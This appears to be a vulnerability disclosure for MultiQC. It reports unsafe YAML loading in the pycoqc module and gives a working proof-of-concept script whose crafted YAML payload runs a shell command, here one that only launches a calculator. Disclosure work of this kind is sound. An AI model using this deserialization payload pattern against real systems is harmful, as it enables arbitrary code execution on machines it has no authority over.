# Description

`MultiQC` Aggregate results from bioinformatics analyses across many samples into a single report. 

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip3 install multiqc
```

### Run exploit.py
```
import os
#os.system('pip3 install multiqc')
from multiqc.modules.pycoqc import pycoqc
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
pycoqc.MultiqcModule.load_data('Anon-Artist',payload)
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
